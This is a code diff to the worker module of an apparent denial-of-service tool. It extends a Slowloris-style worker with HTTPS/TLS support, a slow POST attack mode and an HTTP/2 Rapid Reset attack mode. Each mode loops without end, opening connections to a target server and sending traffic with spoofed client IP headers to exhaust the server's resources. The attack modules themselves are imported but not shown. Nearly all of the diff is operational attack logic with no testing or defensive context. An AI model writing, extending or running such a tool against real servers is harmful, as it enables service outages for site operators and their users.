@@ -6,6 +6,7 @@ Attack Worker - Individual thread attack logic
 """
 
 import socket
+import ssl
 import random
 import time
 import logging
@@ -14,6 +15,10 @@ from typing import Optional
 from .statistics import AttackStatistics
 from .ip_generator import IPGenerator
 from .http_methods import HTTPMethodBuilder, HTTPMethod
+from .tls_handler import TLSConfig, TLSHandler
+from .attack_types import AttackType
+from .slow_post import SlowPostAttack
+from .http2_rapid_reset import H2RapidResetAttack
 from ..config import USER_AGENTS, DEFAULT_TIMEOUT, DEFAULT_KEEP_ALIVE_INTERVAL
 
 class AttackWorker:
@@ -29,7 +34,13 @@ class AttackWorker:
         http_method: Optional[HTTPMethod] = None,
         randomize_method: bool = False,
         timeout: int = DEFAULT_TIMEOUT, 
-        keep_alive_interval: int = DEFAULT_KEEP_ALIVE_INTERVAL
+        keep_alive_interval: int = DEFAULT_KEEP_ALIVE_INTERVAL,
+        tls_config: Optional[TLSConfig] = None,
+        attack_type: AttackType = AttackType.SLOWLORIS,
+        slow_post_size: int = 1000000,
+        slow_post_delay: float = 10.0,
+        h2_streams_per_conn: int = 1000,
+        h2_reset_delay: float = 0.0
     ):
         """
         Initialize attack worker
@@ -44,6 +55,12 @@ class AttackWorker:
             randomize_method: Use random HTTP method for each request
             timeout: Socket timeout
             keep_alive_interval: Interval between garbage headers
+            tls_config: TLS configuration for HTTPS (None = HTTP)
+            attack_type: Type of attack to perform (NEW!)
+            slow_post_size: Content-Length for slow POST attack
+            slow_post_delay: Delay between bytes for slow POST
+            h2_streams_per_conn: Streams per connection for HTTP/2 rapid reset
+            h2_reset_delay: Delay between HEADERS and RST_STREAM
         """
         self.target_ip = target_ip
         self.target_port = target_port
@@ -54,7 +71,40 @@ class AttackWorker:
         self.randomize_method = randomize_method
         self.timeout = timeout
         self.keep_alive_interval = keep_alive_interval
+        self.tls_config = tls_config or TLSConfig()
+        self.attack_type = attack_type
+        self.slow_post_size = slow_post_size
+        self.slow_post_delay = slow_post_delay
+        self.h2_streams_per_conn = h2_streams_per_conn
+        self.h2_reset_delay = h2_reset_delay
         self.running = True
+        
+        # Initialize TLS handler if HTTPS enabled
+        self.tls_handler = None
+        if self.tls_config.use_https:
+            self.tls_handler = TLSHandler(self.tls_config)
+        
+        # Initialize slow POST attacker if needed
+        self.slow_post_attacker = None
+        if self.attack_type == AttackType.SLOW_POST:
+            self.slow_post_attacker = SlowPostAttack(
+                target_ip=self.target_ip,
+                target_port=self.target_port,
+                content_length=self.slow_post_size,
+                byte_delay=self.slow_post_delay,
+                worker_id=self.worker_id
+            )
+        
+        # Initialize HTTP/2 rapid reset attacker if needed
+        self.h2_attacker = None
+        if self.attack_type == AttackType.HTTP2_RAPID_RESET:
+            self.h2_attacker = H2RapidResetAttack(
+                target_host=self.target_ip,
+                target_port=self.target_port,
+                streams_per_connection=self.h2_streams_per_conn,
+                reset_delay=self.h2_reset_delay,
+                worker_id=self.worker_id
+            )
         
     def stop(self):
         """Dừng worker"""
@@ -103,7 +153,18 @@ class AttackWorker:
             )
         
     def run(self):
-        """Main worker loop - Slowloris style attack với IP spoofing"""
+        """Main worker loop - Support multiple attack types"""
+        # Delegate to specific attack method based on attack_type
+        if self.attack_type == AttackType.SLOW_POST:
+            self.run_slow_post_attack()
+        elif self.attack_type == AttackType.HTTP2_RAPID_RESET:
+            self.run_http2_rapid_reset_attack()
+        else:
+            # Default: Slowloris attack
+            self.run_slowloris_attack()
+    
+    def run_slowloris_attack(self):
+        """Original Slowloris style attack với IP spoofing và HTTPS support"""
         while self.running:
             sock = None
             spoofed_ip = None
@@ -118,8 +179,20 @@ class AttackWorker:
                 sock.settimeout(self.timeout)
                 sock.connect((self.target_ip, self.target_port))
                 
+                # Wrap with SSL/TLS if HTTPS enabled
+                if self.tls_config.use_https and self.tls_handler:
+                    try:
+                        # Use target IP as SNI hostname if not specified
+                        sni_hostname = self.tls_config.sni_hostname or self.target_ip
+                        sock = self.tls_handler.wrap_socket(sock, server_hostname=sni_hostname)
+                        logging.debug(f"Worker {self.worker_id}: SSL/TLS handshake successful")
+                    except ssl.SSLError as e:
+                        self.stats.connection_failed(f"ssl_error_{type(e).__name__}")
+                        logging.debug(f"Worker {self.worker_id}: SSL handshake failed - {e}")
+                        raise
+                
                 self.stats.connection_established(spoofed_ip)
-                logging.debug(f"Worker {self.worker_id}: Connected with IP {spoofed_ip}")
+                logging.debug(f"Worker {self.worker_id}: Connected {'(HTTPS)' if self.tls_config.use_https else '(HTTP)'} with IP {spoofed_ip}")
                 
                 # Gửi HTTP request với spoofing headers
                 http_request = self.build_http_request(spoofed_ip)
@@ -135,6 +208,12 @@ class AttackWorker:
                     sock.send(garbage_header.encode('utf-8'))
                     self.stats.packet_sent()
                     
+            except ssl.SSLError as e:
+                # SSL-specific errors
+                error_type = f"ssl_{type(e).__name__}"
+                self.stats.connection_failed(error_type)
+                logging.debug(f"Worker {self.worker_id}: SSL error - {e}")
+                
             except socket.timeout:
                 self.stats.connection_failed("timeout")
                 logging.debug(f"Worker {self.worker_id}: Connection timeout")
@@ -161,3 +240,154 @@ class AttackWorker:
                 # Delay trước khi reconnect
                 if self.running:
                     time.sleep(0.5)
+    
+    def run_slow_post_attack(self):
+        """Slow POST attack - Send POST body extremely slowly"""
+        while self.running:
+            sock = None
+            spoofed_ip = None
+            
+            try:
+                # Generate spoofed IP
+                if self.use_spoofing:
+                    spoofed_ip = IPGenerator.generate_public_ip()
+                
+                # Create socket connection
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(self.timeout)
+                sock.connect((self.target_ip, self.target_port))
+                
+                # Wrap with SSL/TLS if HTTPS enabled
+                if self.tls_config.use_https and self.tls_handler:
+                    try:
+                        sni_hostname = self.tls_config.sni_hostname or self.target_ip
+                        sock = self.tls_handler.wrap_socket(sock, server_hostname=sni_hostname)
+                        logging.debug(f"Worker {self.worker_id}: Slow POST SSL/TLS handshake successful")
+                    except ssl.SSLError as e:
+                        self.stats.connection_failed(f"ssl_error_{type(e).__name__}")
+                        logging.debug(f"Worker {self.worker_id}: Slow POST SSL handshake failed - {e}")
+                        raise
+                
+                self.stats.connection_established(spoofed_ip)
+                logging.debug(
+                    f"Worker {self.worker_id}: Slow POST connected {'(HTTPS)' if self.tls_config.use_https else '(HTTP)'} "
+                    f"with IP {spoofed_ip} (size={self.slow_post_size}, delay={self.slow_post_delay}s)"
+                )
+                
+                # Execute slow POST attack
+                stats_callback = lambda: self.stats.packet_sent()
+                success = self.slow_post_attacker.execute_attack(
+                    sock=sock,
+                    spoofed_ip=spoofed_ip,
+                    stats_callback=stats_callback
+                )
+                
+                if success:
+                    logging.debug(f"Worker {self.worker_id}: Slow POST attack completed")
+                else:
+                    logging.debug(f"Worker {self.worker_id}: Slow POST attack interrupted")
+                    
+            except ssl.SSLError as e:
+                # SSL-specific errors
+                error_type = f"ssl_{type(e).__name__}"
+                self.stats.connection_failed(error_type)
+                logging.debug(f"Worker {self.worker_id}: Slow POST SSL error - {e}")
+                
+            except socket.timeout:
+                self.stats.connection_failed("timeout")
+                logging.debug(f"Worker {self.worker_id}: Slow POST connection timeout")
+                
+            except socket.error as e:
+                error_type = type(e).__name__
+                self.stats.connection_failed(error_type)
+                logging.debug(f"Worker {self.worker_id}: Slow POST socket error - {error_type}")
+                
+            except Exception as e:
+                error_type = type(e).__name__
+                self.stats.connection_failed(error_type)
+                logging.error(f"Worker {self.worker_id}: Slow POST unexpected error - {e}")
+                
+            finally:
+                # Cleanup
+                if sock:
+                    try:
+                        sock.close()
+                        self.stats.connection_closed()
+                    except:
+                        pass
+                
+                # Delay before reconnect
+                if self.running:
+                    time.sleep(1.0)  # Longer delay for slow POST
+    
+    def run_http2_rapid_reset_attack(self):
+        """HTTP/2 Rapid Reset attack - Spam stream creation and cancellation"""
+        while self.running:
+            sock = None
+            spoofed_ip = None
+            
+            try:
+                # Generate spoofed IP (for logging, not used in HTTP/2)
+                if self.use_spoofing:
+                    spoofed_ip = IPGenerator.generate_public_ip()
+                
+                # Create socket connection
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(self.timeout)
+                sock.connect((self.target_ip, self.target_port))
+                
+                self.stats.connection_established(spoofed_ip)
+                logging.debug(
+                    f"Worker {self.worker_id}: HTTP/2 Rapid Reset connected "
+                    f"with IP {spoofed_ip} (streams={self.h2_streams_per_conn}, delay={self.h2_reset_delay}s)"
+                )
+                
+                # Execute HTTP/2 rapid reset attack
+                stats_callback = lambda: self.stats.packet_sent()
+                sni_hostname = self.tls_config.sni_hostname if self.tls_config else None
+                
+                success = self.h2_attacker.execute_attack(
+                    sock=sock,
+                    spoofed_ip=spoofed_ip,
+                    stats_callback=stats_callback,
+                    sni_hostname=sni_hostname
+                )
+                
+                if success:
+                    logging.debug(f"Worker {self.worker_id}: HTTP/2 rapid reset attack completed")
+                else:
+                    logging.debug(f"Worker {self.worker_id}: HTTP/2 rapid reset attack failed")
+                    self.stats.connection_failed("http2_not_supported")
+                    
+            except ssl.SSLError as e:
+                # SSL-specific errors
+                error_type = f"ssl_{type(e).__name__}"
+                self.stats.connection_failed(error_type)
+                logging.debug(f"Worker {self.worker_id}: HTTP/2 SSL error - {e}")
+                
+            except socket.timeout:
+                self.stats.connection_failed("timeout")
+                logging.debug(f"Worker {self.worker_id}: HTTP/2 connection timeout")
+                
+            except socket.error as e:
+                error_type = type(e).__name__
+                self.stats.connection_failed(error_type)
+                logging.debug(f"Worker {self.worker_id}: HTTP/2 socket error - {error_type}")
+                
+            except Exception as e:
+                error_type = type(e).__name__
+                self.stats.connection_failed(error_type)
+                logging.error(f"Worker {self.worker_id}: HTTP/2 unexpected error - {e}")
+                
+            finally:
+                # Cleanup
+                if sock:
+                    try:
+                        sock.close()
+                        self.stats.connection_closed()
+                    except:
+                        pass
+                
+                # Delay before reconnect (longer for HTTP/2)
+                if self.running:
+                    time.sleep(2.0)  # 2s delay between HTTP/2 connections
